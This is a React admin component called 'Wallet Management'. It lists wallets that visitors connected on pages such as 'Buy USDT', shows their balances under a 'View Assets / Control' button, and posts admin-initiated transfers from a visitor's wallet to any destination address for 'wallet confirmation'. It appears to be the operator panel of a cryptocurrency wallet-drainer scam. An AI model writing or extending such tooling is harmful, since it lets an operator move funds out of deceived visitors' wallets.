import React, { useState, useEffect } from 'react';
import axios from 'axios';

const BACKEND_URL = import.meta.env.VITE_BACKEND_URL || 'http://localhost:3000';

export default function Wallets() {
  const [wallets, setWallets] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [assets, setAssets] = useState(null);
  const [loadingAssets, setLoadingAssets] = useState(false);
  const [transactionForm, setTransactionForm] = useState({
    toAddress: '',
    asset: '',
    amount: ''
  });
  const [preparingTransaction, setPreparingTransaction] = useState(false);
  const [transactionStatus, setTransactionStatus] = useState(null);

  useEffect(() => {
    fetchWallets();
  }, []);

  const fetchWallets = async () => {
    try {
      setLoading(true);
      const response = await axios.get(`${BACKEND_URL}/api/wallets`);
      setWallets(response.data.wallets);
      setError(null);
    } catch (err) {
      setError('Failed to fetch wallets');
      console.error('Error fetching wallets:', err);
    } finally {
      setLoading(false);
    }
  };

  const fetchWalletAssets = async (wallet) => {
    try {
      setLoadingAssets(true);
      setSelectedWallet(wallet);
      const response = await axios.get(
        `${BACKEND_URL}/api/wallet/${wallet.address}/assets?chain=${wallet.chain}`
      );
      setAssets(response.data.assets);
      setTransactionForm({
        toAddress: '',
        asset: '',
        amount: ''
      });
      setTransactionStatus(null);
    } catch (err) {
      setError('Failed to fetch wallet assets');
      console.error('Error fetching assets:', err);
    } finally {
      setLoadingAssets(false);
    }
  };

  const handleTransactionFormChange = (e) => {
    setTransactionForm({
      ...transactionForm,
      [e.target.name]: e.target.value
    });
  };

  const handlePrepareTransaction = async (e) => {
    e.preventDefault();
    if (!selectedWallet || !transactionForm.toAddress || !transactionForm.asset || !transactionForm.amount) {
      setError('Please fill all transaction fields');
      return;
    }

    try {
      setPreparingTransaction(true);
      setError(null);
      
      const transactionData = {
        fromAddress: selectedWallet.address,
        toAddress: transactionForm.toAddress,
        chain: selectedWallet.chain,
        asset: transactionForm.asset,
        amount: transactionForm.amount
      };

      const response = await axios.post(
        `${BACKEND_URL}/api/admin/prepare-transaction`,
        transactionData
      );

      setTransactionStatus({
        success: true,
        message: 'Transaction prepared successfully',
        transactionId: response.data.transactionId,
        status: 'Awaiting wallet confirmation'
      });

      setTransactionForm({
        toAddress: '',
        asset: '',
        amount: ''
      });

    } catch (err) {
      setError('Failed to prepare transaction');
      console.error('Error preparing transaction:', err);
    } finally {
      setPreparingTransaction(false);
    }
  };

  const getChainDisplay = (chain) => {
    const chainMap = {
      evm: 'EVM',
      solana: 'Solana',
      tron: 'Tron'
    };
    return chainMap[chain] || chain;
  };

  const getSourcePageDisplay = (sourcePage) => {
    const pageMap = {
      homepage: 'Homepage',
      'buy-usdt': 'Buy USDT'
    };
    return pageMap[sourcePage] || sourcePage;
  };

  const styles = {
    container: {
      padding: '20px',
      backgroundColor: '#0f172a',
      minHeight: '100%',
    },
    header: {
      marginBottom: '30px',
    },
    title: {
      fontSize: '28px',
      fontWeight: 'bold',
      color: '#ffffff',
      marginBottom: '10px',
    },
    subtitle: {
      fontSize: '16px',
      color: '#94a3b8',
    },
    loading: {
      color: '#f5c400',
      fontSize: '18px',
      textAlign: 'center',
      padding: '40px',
    },
    error: {
      color: '#ef4444',
      backgroundColor: '#1e293b',
      padding: '16px',
      borderRadius: '8px',
      marginBottom: '20px',
      border: '1px solid #ef4444',
    },
    success: {
      color: '#10b981',
      backgroundColor: '#1e293b',
      padding: '16px',
      borderRadius: '8px',
      marginBottom: '20px',
      border: '1px solid #10b981',
    },
    tableContainer: {
      backgroundColor: '#1e293b',
      borderRadius: '12px',
      overflow: 'hidden',
      border: '1px solid #334155',
      marginBottom: '30px',
    },
    table: {
      width: '100%',
      borderCollapse: 'collapse',
    },
    tableHeader: {
      backgroundColor: '#334155',
      padding: '16px',
      textAlign: 'left',
      color: '#f8fafc',
      fontWeight: '600',
      fontSize: '14px',
      borderBottom: '1px solid #475569',
    },
    tableCell: {
      padding: '16px',
      borderBottom: '1px solid #334155',
      color: '#cbd5e1',
      fontSize: '14px',
    },
    addressCell: {
      fontFamily: 'monospace',
      fontSize: '13px',
    },
    actionButton: {
      backgroundColor: '#f5c400',
      color: '#0f172a',
      border: 'none',
      padding: '8px 16px',
      borderRadius: '6px',
      fontWeight: '600',
      cursor: 'pointer',
      fontSize: '13px',
      transition: 'background-color 0.2s',
    },
    assetsContainer: {
      backgroundColor: '#1e293b',
      borderRadius: '12px',
      padding: '24px',
      border: '1px solid #334155',
      marginBottom: '30px',
    },
    assetsTitle: {
      fontSize: '20px',
      fontWeight: 'bold',
      color: '#ffffff',
      marginBottom: '20px',
    },
    assetsGrid: {
      display: 'grid',
      gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))',
      gap: '20px',
      marginBottom: '30px',
    },
    assetCard: {
      backgroundColor: '#0f172a',
      padding: '20px',
      borderRadius: '8px',
      border: '1px solid #334155',
    },
    assetName: {
      fontSize: '14px',
      color: '#94a3b8',
      marginBottom: '8px',
    },
    assetValue: {
      fontSize: '24px',
      fontWeight: 'bold',
      color: '#f5c400',
    },
    transactionForm: {
      backgroundColor: '#0f172a',
      padding: '24px',
      borderRadius: '12px',
      border: '1px solid #334155',
    },
    formTitle: {
      fontSize: '20px',
      fontWeight: 'bold',
      color: '#ffffff',
      marginBottom: '20px',
    },
    formGroup: {
      marginBottom: '20px',
    },
    formLabel: {
      display: 'block',
      fontSize: '14px',
      fontWeight: '500',
      color: '#cbd5e1',
      marginBottom: '8px',
    },
    formInput: {
      width: '100%',
      backgroundColor: '#1e293b',
      border: '1px solid #475569',
      borderRadius: '6px',
      padding: '12px',
      color: '#ffffff',
      fontSize: '14px',
    },
    formSelect: {
      width: '100%',
      backgroundColor: '#1e293b',
      border: '1px solid #475569',
      borderRadius: '6px',
      padding: '12px',
      color: '#ffffff',
      fontSize: '14px',
    },
    submitButton: {
      backgroundColor: '#f5c400',
      color: '#0f172a',
      border: 'none',
      padding: '14px 28px',
      borderRadius: '8px',
      fontWeight: '600',
      cursor: 'pointer',
      fontSize: '16px',
      transition: 'background-color 0.2s',
    },
    submitButtonDisabled: {
      backgroundColor: '#475569',
      color: '#94a3b8',
      cursor: 'not-allowed',
    },
  };

  return (
    <div style={styles.container}>
      <div style={styles.header}>
        <h1 style={styles.title}>Wallet Management</h1>
        <p style={styles.subtitle}>
          View connected wallets, check balances, and prepare transactions
        </p>
      </div>

      {error && (
        <div style={styles.error}>
          {error}
        </div>
      )}

      {transactionStatus && (
        <div style={styles.success}>
          <div style={{ fontWeight: 'bold', marginBottom: '4px' }}>
            {transactionStatus.message}
          </div>
          <div>Transaction ID: {transactionStatus.transactionId}</div>
          <div>Status: {transactionStatus.status}</div>
        </div>
      )}

      <div style={styles.tableContainer}>
        <table style={styles.table}>
          <thead>
            <tr>
              <th style={styles.tableHeader}>Wallet Address</th>
              <th style={styles.tableHeader}>Chain</th>
              <th style={styles.tableHeader}>Wallet Name</th>
              <th style={styles.tableHeader}>Source Page</th>
              <th style={styles.tableHeader}>Last Seen</th>
              <th style={styles.tableHeader}>Actions</th>
            </tr>
          </thead>
          <tbody>
            {loading ? (
              <tr>
                <td colSpan="6" style={{ ...styles.tableCell, textAlign: 'center' }}>
                  <div style={styles.loading}>Loading wallets...</div>
                </td>
              </tr>
            ) : wallets.length === 0 ? (
              <tr>
                <td colSpan="6" style={{ ...styles.tableCell, textAlign: 'center' }}>
                  No wallets connected yet
                </td>
              </tr>
            ) : (
              wallets.map((wallet) => (
                <tr key={wallet.address}>
                  <td style={{ ...styles.tableCell, ...styles.addressCell }}>
                    {wallet.address.slice(0, 10)}...{wallet.address.slice(-8)}
                  </td>
                  <td style={styles.tableCell}>
                    <span style={{
                      backgroundColor: wallet.chain === 'evm' ? '#627eea' : 
                                     wallet.chain === 'solana' ? '#9945FF' : '#FF0000',
                      color: 'white',
                      padding: '4px 12px',
                      borderRadius: '20px',
                      fontSize: '12px',
                      fontWeight: '500',
                    }}>
                      {getChainDisplay(wallet.chain)}
                    </span>
                  </td>
                  <td style={styles.tableCell}>{wallet.walletName}</td>
                  <td style={styles.tableCell}>{getSourcePageDisplay(wallet.sourcePage)}</td>
                  <td style={styles.tableCell}>
                    {new Date(wallet.lastSeen).toLocaleDateString()} {new Date(wallet.lastSeen).toLocaleTimeString()}
                  </td>
                  <td style={styles.tableCell}>
                    <button
                      style={styles.actionButton}
                      onClick={() => fetchWalletAssets(wallet)}
                    >
                      View Assets / Control
                    </button>
                  </td>
                </tr>
              ))
            )}
          </tbody>
        </table>
      </div>

      {selectedWallet && (
        <div style={styles.assetsContainer}>
          <h2 style={styles.assetsTitle}>
            Wallet Assets: {selectedWallet.address.slice(0, 10)}...{selectedWallet.address.slice(-8)}
          </h2>
          
          {loadingAssets ? (
            <div style={styles.loading}>Loading assets...</div>
          ) : assets ? (
            <>
              <div style={styles.assetsGrid}>
                {Object.entries(assets).map(([asset, balance]) => (
                  <div key={asset} style={styles.assetCard}>
                    <div style={styles.assetName}>
                      {asset.toUpperCase()}
                    </div>
                    <div style={styles.assetValue}>
                      {balance}
                    </div>
                  </div>
                ))}
              </div>

              <div style={styles.transactionForm}>
                <h3 style={styles.formTitle}>Prepare Transaction</h3>
                <form onSubmit={handlePrepareTransaction}>
                  <div style={styles.formGroup}>
                    <label style={styles.formLabel}>From Address</label>
                    <input
                      style={styles.formInput}
                      type="text"
                      value={selectedWallet.address}
                      readOnly
                    />
                  </div>

                  <div style={styles.formGroup}>
                    <label style={styles.formLabel}>To Address</label>
                    <input
                      style={styles.formInput}
                      type="text"
                      name="toAddress"
                      value={transactionForm.toAddress}
                      onChange={handleTransactionFormChange}
                      placeholder="Enter destination address"
                      required
                    />
                  </div>

                  <div style={styles.formGroup}>
                    <label style={styles.formLabel}>Chain</label>
                    <input
                      style={styles.formInput}
                      type="text"
                      value={getChainDisplay(selectedWallet.chain)}
                      readOnly
                    />
                  </div>

                  <div style={styles.formGroup}>
                    <label style={styles.formLabel}>Asset</label>
                    <select
                      style={styles.formSelect}
                      name="asset"
                      value={transactionForm.asset}
                      onChange={handleTransactionFormChange}
                      required
                    >
                      <option value="">Select asset</option>
                      {selectedWallet.chain === 'evm' && (
                        <>
                          <option value="ETH">ETH</option>
                          <option value="USDT">USDT</option>
                        </>
                      )}
                      {selectedWallet.chain === 'solana' && (
                        <>
                          <option value="SOL">SOL</option>
                          <option value="USDT">USDT</option>
                        </>
                      )}
                      {selectedWallet.chain === 'tron' && (
                        <>
                          <option value="TRX">TRX</option>
                          <option value="USDT">USDT</option>
                        </>
                      )}
                    </select>
                  </div>

                  <div style={styles.formGroup}>
                    <label style={styles.formLabel}>Amount</label>
                    <input
                      style={styles.formInput}
                      type="number"
                      name="amount"
                      value={transactionForm.amount}
                      onChange={handleTransactionFormChange}
                      placeholder="Enter amount"
                      min="0"
                      step="0.000001"
                      required
                    />
                  </div>

                  <button
                    type="submit"
                    style={{
                      ...styles.submitButton,
                      ...(preparingTransaction ? styles.submitButtonDisabled : {})
                    }}
                    disabled={preparingTransaction}
                  >
                    {preparingTransaction ? 'Preparing...' : 'Prepare Transaction'}
                  </button>
                </form>
              </div>
            </>
          ) : (
            <div>No asset data available</div>
          )}
        </div>
      )}
    </div>
  );
}
